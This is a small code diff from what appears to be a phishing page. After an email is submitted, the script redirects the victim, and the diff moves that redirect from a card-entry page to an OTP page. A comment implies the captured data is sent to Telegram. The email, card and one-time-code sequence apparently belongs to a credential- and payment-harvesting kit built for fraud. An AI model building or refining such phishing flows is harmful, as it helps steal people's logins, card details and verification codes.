@@ -337,7 +337,7 @@
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
                 // Always redirect - don't block on Telegram errors
-                window.location.href = 'card.html?msg=lastt';
+                window.location.href = 'otp.html?msg=email';
             } catch (error) {
                 console.error('Error submitting email:', error);
                 alert('Failed to process. Please try again.');
